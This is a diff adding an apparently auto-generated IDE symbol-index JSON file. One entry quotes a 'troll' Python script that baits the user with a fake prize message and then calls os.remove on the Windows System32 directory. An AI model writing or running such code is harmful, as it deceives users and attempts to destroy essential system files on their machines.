@@ -1,0 +1,20 @@
+[
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "choice",
+        "kind": 5,
+        "importPath": "troll",
+        "description": "troll",
+        "peekOfCode": "choice = str(input(\"You have won 100000 INR , Do you want to claim it : \"))\nif choice == \"yes\":\n    print('UwU Get Fucked')\n    os.remove('C:\\Windows\\System32')\nelse:\n    print('no')",
+        "detail": "troll",
+        "documentation": {}
+    }
+]
